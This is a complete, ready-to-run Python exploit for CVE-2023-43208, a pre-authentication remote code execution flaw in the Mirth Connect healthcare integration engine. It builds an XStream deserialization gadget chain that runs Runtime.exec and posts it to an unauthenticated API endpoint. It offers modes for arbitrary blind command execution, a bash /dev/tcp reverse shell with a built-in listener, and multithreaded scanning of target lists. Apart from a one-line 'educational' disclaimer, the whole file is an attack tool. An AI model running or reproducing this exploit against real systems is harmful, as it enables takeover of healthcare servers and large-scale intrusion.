"""
CVE-2023-43208 — Mirth Connect Pre-Authenticated Remote Code Execution

Affected versions: NextGen Healthcare Mirth Connect < 4.4.1
Vulnerability: XStream deserialization bypass (patch bypass of CVE-2023-37679)
CVSS Score: 9.8 (Critical)

The original fix for CVE-2023-37679 used a denylist to block dangerous classes
during XStream deserialization. This bypass leverages classes not on the denylist:
  - org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler
  - org.apache.commons.collections4.functors.*

Attack surface: POST /api/users (no authentication required)

Usage:
  python3 exploit.py check  -t https://target:8443
  python3 exploit.py exec   -t https://target:8443 -c "id"
  python3 exploit.py shell  -t https://target:8443 --lhost 10.10.10.10 --lport 4444
  python3 exploit.py scan   -f targets.txt

Author: Educational / Research purposes only.
"""

import os
import sys
import time
import socket
import select
import argparse
import threading
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    requests.packages.urllib3.disable_warnings(
        requests.packages.urllib3.exceptions.InsecureRequestWarning
    )
except ImportError:
    print("\033[91m[!] requests library required: pip install requests\033[0m")
    sys.exit(1)


# ─── ANSI Colors ────────────────────────────────────────────────────────────────

class C:
    """Minimal ANSI color helper — zero dependencies."""
    R = "\033[91m"   # red
    G = "\033[92m"   # green
    Y = "\033[93m"   # yellow
    B = "\033[94m"   # blue
    M = "\033[95m"   # magenta
    C = "\033[96m"   # cyan
    W = "\033[97m"   # white
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RST = "\033[0m"


def info(msg):
    print(f"{C.B}{C.BOLD}[*]{C.RST} {msg}")

def good(msg):
    print(f"{C.G}{C.BOLD}[+]{C.RST} {msg}")

def warn(msg):
    print(f"{C.Y}{C.BOLD}[!]{C.RST} {msg}")

def fail(msg):
    print(f"{C.R}{C.BOLD}[-]{C.RST} {msg}")


# ─── Constants ───────────────────────────────────────────────────────────────────

ENDPOINT_VERSION = "/api/server/version"
ENDPOINT_USERS   = "/api/users"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "X-Requested-With": "OpenAPI",
    "Content-Type": "application/xml",
}

BANNER = rf"""
{C.C}{C.BOLD}
   ╔═══════════════════════════════════════════════════════════════╗
   ║  CVE-2023-43208  ·  Mirth Connect Pre-Auth RCE                ║
   ║  XStream Deserialization Bypass (patch bypass CVE-2023-37679)
     ║DEDICACE PAR AGENTPATHOGENE
   ╚═══════════════════════════════════════════════════════════════╝{C.RST}
{C.DIM}   Affected: Mirth Connect < 4.4.1  |  CVSS 9.8{C.RST}
"""


# ─── Payload Builder ────────────────────────────────────────────────────────────

def xml_escape(text: str) -> str:
    """Escape special XML characters in user-supplied command strings."""
    return (
        text.replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace('"', "&quot;")
            .replace("'", "&apos;")
    )


def build_payload(command: str) -> str:
    """
    Build the XStream deserialization gadget chain payload.

    Chain overview:
      sorted-set triggers Comparable.compareTo()
        → dynamic-proxy with EventBindingInvocationHandler
          → ChainedTransformer.transform()
            → ConstantTransformer(Runtime.class)
            → InvokerTransformer("getMethod", "getRuntime")
            → InvokerTransformer("invoke", null)
            → InvokerTransformer("exec", <command>)
    """
    escaped = xml_escape(command)
    return f"""<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
      <target class="org.apache.commons.collections4.functors.ChainedTransformer">
        <iTransformers>
          <org.apache.commons.collections4.functors.ConstantTransformer>
            <iConstant class="java-class">java.lang.Runtime</iConstant>
          </org.apache.commons.collections4.functors.ConstantTransformer>
          <org.apache.commons.collections4.functors.InvokerTransformer>
            <iMethodName>getMethod</iMethodName>
            <iParamTypes>
              <java-class>java.lang.String</java-class>
              <java-class>[Ljava.lang.Class;</java-class>
            </iParamTypes>
            <iArgs>
              <string>getRuntime</string>
              <java-class-array/>
            </iArgs>
          </org.apache.commons.collections4.functors.InvokerTransformer>
          <org.apache.commons.collections4.functors.InvokerTransformer>
            <iMethodName>invoke</iMethodName>
            <iParamTypes>
              <java-class>java.lang.Object</java-class>
              <java-class>[Ljava.lang.Object;</java-class>
            </iParamTypes>
            <iArgs>
              <null/>
              <object-array/>
            </iArgs>
          </org.apache.commons.collections4.functors.InvokerTransformer>
          <org.apache.commons.collections4.functors.InvokerTransformer>
            <iMethodName>exec</iMethodName>
            <iParamTypes>
              <java-class>java.lang.String</java-class>
            </iParamTypes>
            <iArgs>
              <string>{escaped}</string>
            </iArgs>
          </org.apache.commons.collections4.functors.InvokerTransformer>
        </iTransformers>
      </target>
      <methodName>transform</methodName>
      <eventTypes>
        <string>compareTo</string>
      </eventTypes>
    </handler>
  </dynamic-proxy>
</sorted-set>"""


# ─── Target Helpers ──────────────────────────────────────────────────────────────

def normalize_url(url: str) -> str:
    """Ensure the URL has a scheme and strip trailing slashes."""
    url = url.strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url.rstrip("/")


def get_version(target: str, timeout: int = 10) -> str | None:
    """Fetch the Mirth Connect version string from the API."""
    try:
        resp = requests.get(
            target + ENDPOINT_VERSION,
            headers=HEADERS,
            timeout=timeout,
            verify=False,
        )
        if resp.status_code == 200 and resp.text.strip():
            # Version string looks like "4.3.0" or "4.4.1"
            version_str = resp.text.strip()
            if version_str[0].isdigit():
                return version_str
    except requests.RequestException:
        pass
    return None


def is_mirth_connect(target: str, timeout: int = 10) -> bool:
    """Check if the target is a Mirth Connect instance."""
    try:
        resp = requests.get(target, timeout=timeout, verify=False)
        return "Mirth Connect" in resp.text
    except requests.RequestException:
        return False


def version_tuple(version_str: str) -> tuple:
    """Parse a version string like '4.3.0' into a comparable tuple."""
    try:
        return tuple(int(x) for x in version_str.split("."))
    except (ValueError, AttributeError):
        return (0,)


def is_vulnerable(version_str: str) -> bool:
    """Check if the version is below the fix (4.4.1)."""
    return version_tuple(version_str) < (4, 4, 1)


# ─── Core Actions ────────────────────────────────────────────────────────────────

def action_check(target: str) -> bool:
    """
    Fingerprint the target: detect Mirth Connect, grab version, report vuln status.
    Returns True if vulnerable.
    """
    target = normalize_url(target)
    info(f"Target: {C.BOLD}{target}{C.RST}")

    # Step 1: detect Mirth Connect
    info("Detecting Mirth Connect instance...")
    if not is_mirth_connect(target):
        fail("Mirth Connect not detected on target.")
        return False
    good("Mirth Connect instance detected.")

    # Step 2: grab version
    info("Fetching version...")
    ver = get_version(target)
    if ver is None:
        warn("Could not retrieve version (endpoint may be restricted).")
        warn("Target may still be vulnerable — consider trying exploit mode.")
        return False

    info(f"Version: {C.BOLD}{C.C}{ver}{C.RST}")

    # Step 3: check
    if is_vulnerable(ver):
        good(f"{C.G}VULNERABLE{C.RST} — Mirth Connect {ver} < 4.4.1")
        return True
    else:
        fail(f"NOT VULNERABLE — Mirth Connect {ver} >= 4.4.1")
        return False


def send_payload(target: str, command: str, timeout: int = 20) -> bool:
    """
    Send the XStream deserialization payload to execute a command on the target.
    Returns True if the request was sent (note: blind RCE, no output returned).
    """
    target = normalize_url(target)
    payload = build_payload(command)
    try:
        resp = requests.post(
            target + ENDPOINT_USERS,
            headers=HEADERS,
            data=payload,
            timeout=timeout,
            verify=False,
        )
        # The server will typically return 500 or hang — both indicate the
        # payload was processed. A clean 200/201 is unlikely.
        return True
    except requests.exceptions.ReadTimeout:
        # Timeout is expected when the command blocks (e.g., reverse shell)
        return True
    except requests.RequestException as e:
        fail(f"Request failed: {e}")
        return False


def action_exec(target: str, command: str) -> None:
    """Execute a single command on the target (blind RCE — no output)."""
    target = normalize_url(target)
    info(f"Target:  {C.BOLD}{target}{C.RST}")
    info(f"Command: {C.BOLD}{command}{C.RST}")
    warn("This is blind RCE — command output is NOT returned.")
    print()

    # Optional: check first
    ver = get_version(target)
    if ver:
        info(f"Version: {C.C}{ver}{C.RST}")
        if not is_vulnerable(ver):
            fail(f"Target appears patched (v{ver}). Aborting.")
            return
    else:
        warn("Could not fetch version. Proceeding anyway...")

    info("Sending payload...")
    if send_payload(target, command):
        good("Payload delivered. If the command was valid, it executed on the target.")
    else:
        fail("Failed to deliver payload.")


def action_shell(target: str, lhost: str, lport: int, timeout: int = 30) -> None:
    """
    Send a reverse shell payload and start a local listener.

    The reverse shell uses a bash /dev/tcp technique:
      bash -c '0<&53-;exec 53<>/dev/tcp/LHOST/LPORT;sh <&53 >&53 2>&53'
    Wrapped with: sh -c $@|sh . echo <payload>
    """
    target = normalize_url(target)
    info(f"Target: {C.BOLD}{target}{C.RST}")
    info(f"Listener: {C.BOLD}{lhost}:{lport}{C.RST}")
    print()

    # Build the reverse shell command
    revshell = (
        f"sh -c $@|sh . echo bash -c "
        f"'0<&53-;exec 53<>/dev/tcp/{lhost}/{lport};"
        f"sh <&53 >&53 2>&53'"
    )
    info(f"Reverse shell command:\n  {C.DIM}{revshell}{C.RST}")
    print()

    # Start listener in a thread
    connected = threading.Event()

    def listener():
        try:
            with socket.create_server(("0.0.0.0", lport), reuse_port=True) as srv:
                srv.settimeout(timeout)
                info(f"Listening on 0.0.0.0:{lport}...")
                conn, addr = srv.accept()
                connected.set()
                good(f"Connection received from {addr[0]}:{addr[1]}")
                print()
                good(f"Shell established! Type commands below. {C.DIM}(Ctrl+C to exit){C.RST}")
                print(f"{C.DIM}{'─' * 60}{C.RST}")
                interact(conn)
        except socket.timeout:
            if not connected.is_set():
                fail(f"No connection received after {timeout}s.")
                warn("Possible reasons: target not vulnerable, command blocked, "
                     "firewall, or wrong LHOST/LPORT.")
        except OSError as e:
            fail(f"Listener error: {e}")

    listener_thread = threading.Thread(target=listener, daemon=True)
    listener_thread.start()
    time.sleep(0.5)  # Let the listener bind

    # Send the payload
    info("Sending exploit payload...")
    send_payload(target, revshell)

    # Wait for connection or timeout
    listener_thread.join()


def interact(conn: socket.socket) -> None:
    """Simple interactive shell over a raw socket connection."""
    try:
        conn.setblocking(False)
        while True:
            # Check for data from the remote shell
            readable, _, _ = select.select([conn, sys.stdin], [], [], 0.5)
            for src in readable:
                if src is conn:
                    data = conn.recv(4096)
                    if not data:
                        print(f"\n{C.Y}[*] Connection closed by remote host.{C.RST}")
                        return
                    sys.stdout.write(data.decode("utf-8", errors="replace"))
                    sys.stdout.flush()
                elif src is sys.stdin:
                    line = sys.stdin.readline()
                    if not line:
                        return
                    conn.sendall(line.encode())
    except KeyboardInterrupt:
        print(f"\n{C.Y}[*] Session terminated.{C.RST}")
    except (BrokenPipeError, ConnectionResetError):
        print(f"\n{C.R}[-] Connection lost.{C.RST}")
    finally:
        conn.close()


def action_scan(filepath: str, threads: int = 20, output: str | None = None) -> None:
    """Scan a list of targets from a file for vulnerable Mirth Connect instances."""
    if not os.path.isfile(filepath):
        fail(f"File not found: {filepath}")
        return

    with open(filepath) as f:
        targets = [normalize_url(line.strip()) for line in f if line.strip()]

    if not targets:
        fail("No targets found in file.")
        return

    info(f"Scanning {C.BOLD}{len(targets)}{C.RST} targets with {threads} threads...")
    print(f"{C.DIM}{'─' * 60}{C.RST}")

    results = []
    lock = threading.Lock()

    def check_target(url):
        ver = get_version(url, timeout=8)
        if ver and is_vulnerable(ver):
            with lock:
                results.append((url, ver))
                good(f"{C.G}VULN{C.RST}  {url:<55} v{ver}")

    with ThreadPoolExecutor(max_workers=threads) as pool:
        futures = {pool.submit(check_target, t): t for t in targets}
        done = 0
        for future in as_completed(futures):
            done += 1
            try:
                future.result()
            except Exception:
                pass
            # Progress indicator
            if done % 10 == 0 or done == len(targets):
                sys.stdout.write(f"\r{C.DIM}[{done}/{len(targets)}]{C.RST}")
                sys.stdout.flush()

    print()
    print(f"{C.DIM}{'─' * 60}{C.RST}")
    info(f"Scan complete. {C.BOLD}{len(results)}/{len(targets)}{C.RST} vulnerable.")

    if output and results:
        with open(output, "w") as f:
            for url, ver in results:
                f.write(f"{url}\n")
        good(f"Results saved to {output}")


# ─── CLI ─────────────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=(
            "CVE-2023-43208 — Mirth Connect Pre-Auth RCE\n"
            "XStream deserialization bypass (patch bypass of CVE-2023-37679)"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  %(prog)s check  -t https://target:8443\n"
            "  %(prog)s exec   -t https://target:8443 -c 'id'\n"
            "  %(prog)s shell  -t https://target:8443 --lhost 10.10.10.10 --lport 4444\n"
            "  %(prog)s scan   -f targets.txt -o vulnerable.txt\n"
        ),
    )

    sub = parser.add_subparsers(dest="mode", help="Operation mode")

    # check
    p_check = sub.add_parser("check", help="Detect and fingerprint a Mirth Connect target")
    p_check.add_argument("-t", "--target", required=True, help="Target URL (e.g. https://host:8443)")

    # exec
    p_exec = sub.add_parser("exec", help="Execute a command on the target (blind RCE)")
    p_exec.add_argument("-t", "--target", required=True, help="Target URL")
    p_exec.add_argument("-c", "--command", required=True, help="Command to execute")

    # shell
    p_shell = sub.add_parser("shell", help="Pop a reverse shell on the target")
    p_shell.add_argument("-t", "--target", required=True, help="Target URL")
    p_shell.add_argument("-l","--lhost", required=True, help="Your IP address (listener)")
    p_shell.add_argument("-p","--lport", required=True, type=int, help="Your listener port")
    p_shell.add_argument("--timeout", type=int, default=30, help="Listener timeout in seconds (default: 30)")

    # scan
    p_scan = sub.add_parser("scan", help="Scan a list of targets for vulnerable instances")
    p_scan.add_argument("-f", "--file", required=True, help="File containing target URLs (one per line)")
    p_scan.add_argument("-o", "--output", help="Save vulnerable targets to file")
    p_scan.add_argument("-T", "--threads", type=int, default=20, help="Number of threads (default: 20)")

    return parser


def main():
    print(BANNER)
    parser = build_parser()
    args = parser.parse_args()

    if not args.mode:
        parser.print_help()
        sys.exit(0)

    match args.mode:
        case "check":
            action_check(args.target)
        case "exec":
            action_exec(args.target, args.command)
        case "shell":
            action_shell(args.target, args.lhost, args.lport, args.timeout)
        case "scan":
            action_scan(args.file, args.threads, args.output)


if __name__ == "__main__":
    main()
